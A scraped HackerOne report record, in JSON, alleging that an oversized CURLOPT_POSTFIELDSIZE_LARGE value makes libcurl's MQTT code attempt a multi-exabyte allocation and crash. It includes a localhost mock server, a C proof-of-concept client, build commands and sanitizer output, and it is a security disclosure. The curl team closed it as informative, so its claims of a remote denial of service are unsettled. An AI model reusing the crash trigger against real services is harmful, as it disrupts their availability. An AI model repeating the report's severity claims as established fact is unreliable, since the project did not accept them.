@@ -1,0 +1,200 @@
+{
+  "id": 3417428,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE3NDI4",
+  "url": "https://hackerone.com/reports/3417428",
+  "title": "libcurl MQTT `CURLOPT_POSTFIELDSIZE_LARGE` overflow leads to immediate DoS",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2025-11-09T05:51:21.153Z",
+  "submitted_at": "2025-11-09T05:51:21.431Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jiyong",
+    "url": "/jiyong",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-11-10T15:00:34.669Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-11-10T09:45:28.438Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nAn attacker can crash or forcefully abort any application that uses libcurl's MQTT support by setting an excessively large value for `CURLOPT_POSTFIELDSIZE_LARGE`. The MQTT publish logic (`lib/mqtt.c::mqtt_publish`) trusts this value without validating it against the protocol's maximum remaining length (268,435,455) and without checking for arithmetic overflow. As a result, it attempts to allocate an impossibly large buffer (several exabytes) and immediately fails with either an abort (AddressSanitizer) or a `CURLE_OUT_OF_MEMORY` error, terminating the process and causing a Denial of Service.\n\n## Impact\n- **Availability:** Any service that allows untrusted input to influence `CURLOPT_POSTFIELDSIZE(_LARGE)`—for example, user-controlled message lengths or proxied MQTT requests—can be brought down instantly. A single malicious request is enough to trigger the crash.\n- **Stability:** Even in non-ASan builds, the call consistently returns `CURLE_OUT_OF_MEMORY`; applications that treat this as fatal (common for MQTT producers) will shut down. When compiled with sanitizers, the process aborts on the spot due to an \"allocation-size-too-big\" assertion.\n- **Scope:** No authentication or man-in-the-middle capability is required. Simply making the client construct a publish request with a massive length triggers the bug.\n\n## Attack Scenario\n1. The attacker convinces a libcurl-based MQTT client or gateway to publish a message whose size field is set to ~4 exabytes (or any value over 0x0FFFFFFF).\n2. The client calls `curl_easy_setopt(handle, CURLOPT_POSTFIELDSIZE_LARGE, huge_value)` and eventually invokes `curl_easy_perform()`.\n3. Inside `mqtt_publish`, libcurl calculates the MQTT remaining length as `payloadlen + topiclen + 2`, which wraps or exceeds the MQTT specification limit. It then calls `malloc(remaininglength + 1 + encodelen)`.\n4. `malloc()` cannot satisfy the request and aborts (ASan) or returns NULL (if `allocator_may_return_null=1`). In either case, the application dies or enters a failure state, causing a denial of service without ever sending the payload to the broker.\n\n## Proof of Concept\nTwo files are needed: a minimal MQTT mock server and a client PoC that sets an oversized payload length.\n\n### `mqtt_server.py`\n```python\nimport socket\n\nHOST, PORT = \"127.0.0.1\", 1883\nCONNACK = b\"\\x20\\x02\\x00\\x00\"\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((HOST, PORT))\n    s.listen(1)\n    print(f\"[server] listening on {HOST}:{PORT}\")\n    conn, addr = s.accept()\n    with conn:\n        print(f\"[server] accepted connection from {addr}\")\n        data = conn.recv(1024)\n        print(f\"[server] received {len(data)} bytes\")\n        conn.sendall(CONNACK)\n        print(\"[server] sent CONNACK\")\n        conn.recv(1024)\n        print(\"[server] received publish (possibly truncated)\")\n```\n\n### `mqtt_overflow.c`\n```c\n#include <curl/curl.h>\n#include <stdio.h>\n\nint main(void)\n{\n  CURL *curl = curl_easy_init();\n  if(!curl) {\n    fprintf(stderr, \"curl_easy_init failed\\n\");\n    return 1;\n  }\n\n  const char payload[] = \"X\";                       /* actual data: 1 byte */\n  const curl_off_t fake_size = ((curl_off_t)1 << 62); /* advertise ~4 EB */\n\n  curl_easy_setopt(curl, CURLOPT_URL, \"mqtt://127.0.0.1:1883/topic\");\n  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);\n  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, fake_size);\n  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT_MS, 2000L);\n  curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 3000L);\n  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n\n  fprintf(stderr, \"[*] requesting payload size: %lld\\n\", (long long)fake_size);\n\n  CURLcode res = curl_easy_perform(curl);\n  fprintf(stderr, \"curl_easy_perform: %d\\n\", res);\n\n  curl_easy_cleanup(curl);\n  return (int)res;\n}\n```\n\n### Build & Run\n```bash\n# Configure and build libcurl with MQTT enabled (example using CMake)\ncmake -S . -B build-mqtt -DCMAKE_BUILD_TYPE=Debug -DCURL_USE_LIBPSL=OFF\ncmake --build build-mqtt --target libcurl_shared -- -j8\n\n# Compile PoC with AddressSanitizer\nclang -fsanitize=address -Iinclude -Ibuild-mqtt/lib \\\n  -Lbuild-mqtt/lib -Wl,-rpath,build-mqtt/lib \\\n  build-mqtt/poc/mqtt_overflow.c -lcurl-d -o build-mqtt/poc/mqtt_overflow\n\n# Launch mock server and execute PoC\npython3 build-mqtt/poc/mqtt_server.py &\nbuild-mqtt/poc/mqtt_overflow\n```\n\n### Observed Output (ASan build)\n```\n[*] requesting payload size: 4611686018427387904\n*   Trying 127.0.0.1:1883...\n* Established connection to 127.0.0.1 (127.0.0.1 port 1883) from 127.0.0.1 port 62013 \n* Using client id 'curlgqXILtsX'\n==12584==ERROR: AddressSanitizer: requested allocation size 0x400000000000000c ...\nSUMMARY: AddressSanitizer: allocation-size-too-big mqtt.c:616 in mqtt_publish\n==12584==ABORTING\n```\n\n### Observed Output (allocator may return NULL)\n```\n$ ASAN_OPTIONS=allocator_may_return_null=1 build-mqtt/poc/mqtt_overflow\n[*] requesting payload size: 4611686018427387904\n==13457==WARNING: AddressSanitizer failed to allocate 0x400000000000000c bytes\ncurl_easy_perform: 27\n```\n\nThe mock server log confirms that the connection is opened, a CONNACK is returned, and the client terminates immediately while trying to publish.\n\n## Root Cause\nExcerpt from `lib/mqtt.c`:\n```c\nremaininglength = payloadlen + 2 + topiclen;\nencodelen = mqtt_encode_len(encodedbytes, remaininglength);\n\npkt = malloc(remaininglength + 1 + encodelen);\nif(!pkt) {\n  result = CURLE_OUT_OF_MEMORY;\n  goto fail;\n}\n...\nmemcpy(&pkt[i], payload, payloadlen);\n```\n- `payloadlen` comes directly from `CURLOPT_POSTFIELDSIZE_LARGE`.\n- There is no check that `payloadlen` stays within the MQTT specification (maximum remaining length 0x0FFFFFFF) or within any safe memory bounds.\n- `remaininglength + 1 + encodelen` is computed in `size_t`, so it can wrap or exceed practical memory limits.\n- On failure, the function never reaches the publish stage, effectively crashing the client before any data is sent.\n\n## Recommended Mitigation\n1. **Validate `payloadlen`:** Reject any request where `payloadlen > 0x0FFFFFFF - (topiclen + 2)` and return `CURLE_BAD_FUNCTION_ARGUMENT`.\n2. **Overflow Guard:** Before calling `malloc`, ensure the sum `remaininglength + 1 + encodelen` cannot overflow and fits within a reasonable bound.\n3. **Protocol Compliance:** Consider capping `mqtt_encode_len` to 4 bytes and aborting if the encoded length would exceed MQTT's remaining length limit.\n4. **Regression Test:** Add a unit or integration test that attempts to set an oversized `CURLOPT_POSTFIELDSIZE_LARGE` and ensures the call fails gracefully.\n\n## Environment\n- macOS 15.0 (24A335)\n- Apple Clang 17.0.0.17000319\n- curl 8.17.1-dev (CMake build with MQTT enabled)\n- AddressSanitizer (default settings) and libc runtime without ASan\n\n## Severity\nMedium — Denial of Service via integer overflow / uncontrolled resource consumption (CWE-190 / CWE-400).\n\n## References\n- MQTT Specification (v3.1.1) — Remaining Length field is limited to 268,435,455\n- curl security program: <https://hackerone.com/curl>\n\n## Impact\n\n- Remote attacker can forcefully terminate any libcurl-based MQTT client or service by advertising an oversized MQTT payload.\n- The malformed request causes libcurl to attempt an allocation of several exabytes, which immediately aborts the process (ASan) or returns CURLE_OUT_OF_MEMORY, effectively denying service.\n- No authentication or special network position is required; a single malicious publish request suffices to crash the application.",
+  "weakness": {
+    "id": 15,
+    "name": "Integer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4983213,
+      "file_name": "mqtt_overflow.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xue77q9xksmnwl44b6g7zarjsq43?response-content-disposition=attachment%3B%20filename%3D%22mqtt_overflow.c%22%3B%20filename%2A%3DUTF-8%27%27mqtt_overflow.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRGZOZ6AJ%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042620Z&X-Amz-Expires=1279&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIQDf7%2BCkmC4vmoUvCYfGeWpmDEhoxIRZlUTbD3RkgS1VCAIgFFh6PL%2B%2FnHCtNNiAv7gIkFeaui810ySwXcomHQK0BloqsgUIABADGgwwMTM2MTkyNzQ4NDkiDENyu%2FVWn%2Fjmj1PBzSqPBTnL%2BvhTDsDXtvMXhPTiCMWq%2BTF%2BlMd871hFCWNSncg05%2B%2Fl5KpATubcsDFGiIOv1meIvj8IdhTUPCpMkTUmGaAHmHxIzDq2alycCTfSgBQx%2Ffy%2Btsrazn%2FrMDv5Aq8KGXm4CjuoyDToNlJ6MV6lzFFbpqToq3hrZMp58S0eu5hVFnXNa7BWhYBWdAcENwH6cE53mGFdUDEh6t62a2MfUC%2BCakqYvy443LL5EzHEAFEqxHZJtK0xL4oBLalFaxBYFUXeggEHtCyiDwq0q0zQFK3704ZR%2BMF4gY68HXiaGpWh0USQiZ4EiyOuM%2F4wJ0gVWbFWGygHX6RN234zmaS1gw8IB4MHs%2BRa8k2wcYprHQUjsDXH%2FcVKn6E1RLqcO6uF1F%2BQMTHUj%2FoCL1HVmSeNXeEpt8Wui1cqT20HbsFmukXzkIjSrAHKHKkd9jETOOgtRCx7Q1U59Kyj00T4uVCEQDB%2BgQkvf6CHW6k8YE94KsbpKfl6i7njDMLWQq9icIy5YWrANX8X5faHYvrRfDOSdwRO9fgi%2BvJyS35yv2BmgjMQC%2FVnd%2FxOo4I79mWsoQCkAV%2FKF07qc2aRk60tN0PMb3gNkFAnDKyW9GAiW%2FVpljJCRHbTYw1wcBdbpxEOQ%2FjuudjRmhlYACWo1s8O0LcQF8%2FS1EUbTbouCphlEfodBY%2FV%2BQrgRUA9qXCf%2BEpvcIn1xuShTW8Q0JnqZOYeIUzNht4xzCGWxDj3YCVvXK2AK9PHZ0RECg%2BkPixIO4UX9Ha7kcGUDFb8uLOze6Qm4AuaJFbHuZBBr6KlMuKQFfPFOzdo8eumJSv7DixHbu3g%2B8nKYfsKXAUgxxXUzRSSiaCtXJJIqs%2BKGsmavxz0D7NnXo8w0cub0gY6sQGAKA9v0aV0DdlsvTp1yzc%2BBthW%2BIHYZkRs5odrWpmcuwzSXNJ3Uhttp2G0z%2F2l%2FRxG7dB89MNQRkyzHS0oB%2F%2BkKa%2FLCMcAwKCk2P5WDJDEFjN%2BXM%2FuOE15BISokkzdQMoPKqfpxALjMeAklqxFAQ%2FT%2BmodlMcVVZJJ7tscI8STFDApt%2FUr6OwEnGl5GDPlD%2FNYRhGntai7wot4cp6j5MZRT4Xqe%2FeQP42IIUkEwOY2azA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=71186657010240b4e4cae060cd374aae136aaa86e1913703d93e8691f97363b9",
+      "file_size": 872,
+      "type": "text/x-csrc",
+      "moderated": null
+    },
+    {
+      "id": 4983214,
+      "file_name": "mqtt_server.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7wlm86kujavy3de552y5lsvl16er?response-content-disposition=attachment%3B%20filename%3D%22mqtt_server.py%22%3B%20filename%2A%3DUTF-8%27%27mqtt_server.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRGZOZ6AJ%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042620Z&X-Amz-Expires=1279&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCIQDf7%2BCkmC4vmoUvCYfGeWpmDEhoxIRZlUTbD3RkgS1VCAIgFFh6PL%2B%2FnHCtNNiAv7gIkFeaui810ySwXcomHQK0BloqsgUIABADGgwwMTM2MTkyNzQ4NDkiDENyu%2FVWn%2Fjmj1PBzSqPBTnL%2BvhTDsDXtvMXhPTiCMWq%2BTF%2BlMd871hFCWNSncg05%2B%2Fl5KpATubcsDFGiIOv1meIvj8IdhTUPCpMkTUmGaAHmHxIzDq2alycCTfSgBQx%2Ffy%2Btsrazn%2FrMDv5Aq8KGXm4CjuoyDToNlJ6MV6lzFFbpqToq3hrZMp58S0eu5hVFnXNa7BWhYBWdAcENwH6cE53mGFdUDEh6t62a2MfUC%2BCakqYvy443LL5EzHEAFEqxHZJtK0xL4oBLalFaxBYFUXeggEHtCyiDwq0q0zQFK3704ZR%2BMF4gY68HXiaGpWh0USQiZ4EiyOuM%2F4wJ0gVWbFWGygHX6RN234zmaS1gw8IB4MHs%2BRa8k2wcYprHQUjsDXH%2FcVKn6E1RLqcO6uF1F%2BQMTHUj%2FoCL1HVmSeNXeEpt8Wui1cqT20HbsFmukXzkIjSrAHKHKkd9jETOOgtRCx7Q1U59Kyj00T4uVCEQDB%2BgQkvf6CHW6k8YE94KsbpKfl6i7njDMLWQq9icIy5YWrANX8X5faHYvrRfDOSdwRO9fgi%2BvJyS35yv2BmgjMQC%2FVnd%2FxOo4I79mWsoQCkAV%2FKF07qc2aRk60tN0PMb3gNkFAnDKyW9GAiW%2FVpljJCRHbTYw1wcBdbpxEOQ%2FjuudjRmhlYACWo1s8O0LcQF8%2FS1EUbTbouCphlEfodBY%2FV%2BQrgRUA9qXCf%2BEpvcIn1xuShTW8Q0JnqZOYeIUzNht4xzCGWxDj3YCVvXK2AK9PHZ0RECg%2BkPixIO4UX9Ha7kcGUDFb8uLOze6Qm4AuaJFbHuZBBr6KlMuKQFfPFOzdo8eumJSv7DixHbu3g%2B8nKYfsKXAUgxxXUzRSSiaCtXJJIqs%2BKGsmavxz0D7NnXo8w0cub0gY6sQGAKA9v0aV0DdlsvTp1yzc%2BBthW%2BIHYZkRs5odrWpmcuwzSXNJ3Uhttp2G0z%2F2l%2FRxG7dB89MNQRkyzHS0oB%2F%2BkKa%2FLCMcAwKCk2P5WDJDEFjN%2BXM%2FuOE15BISokkzdQMoPKqfpxALjMeAklqxFAQ%2FT%2BmodlMcVVZJJ7tscI8STFDApt%2FUr6OwEnGl5GDPlD%2FNYRhGntai7wot4cp6j5MZRT4Xqe%2FeQP42IIUkEwOY2azA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22303cf87e0bf318f48547716c4233f2f26486a691787b82ad4f10aebcf8f3d8",
+      "file_size": 704,
+      "type": "text/x-python-script",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "0xdeadbull",
+    "i0xs3dawi",
+    "2026",
+    "kamekame",
+    "biswarup_das",
+    "fahritrh",
+    "alvis42920",
+    "rubee"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3417428",
+  "votes": 8,
+  "latest_disclosable_activity_at": "2025-11-10T15:00:34.468Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:26:20.870534",
+    "source": "https://hackerone.com/reports/3417428.json",
+    "report_id": 3417428
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE3NDI4",
+    "databaseId": "3417428",
+    "title": "libcurl MQTT `CURLOPT_POSTFIELDSIZE_LARGE` overflow leads to immediate DoS",
+    "url": "https://hackerone.com/reports/3417428",
+    "state": null,
+    "substate": "informative",
+    "disclosed_at": "2025-11-10T15:00:34.669Z",
+    "created_at": "2025-11-09T05:51:21.153Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE1",
+      "name": "Integer Overflow",
+      "external_id": "cwe-190"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "jiyong"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM0MTc0Mjg=",
+    "_id": "3417428",
+    "disclosed": true,
+    "votes": 8,
+    "latest_disclosable_activity_at": "2025-11-10T15:00:34.468Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE3NDI4",
+      "databaseId": "3417428",
+      "title": "libcurl MQTT `CURLOPT_POSTFIELDSIZE_LARGE` overflow leads to immediate DoS",
+      "url": "https://hackerone.com/reports/3417428",
+      "disclosed_at": "2025-11-10T15:00:34.669Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
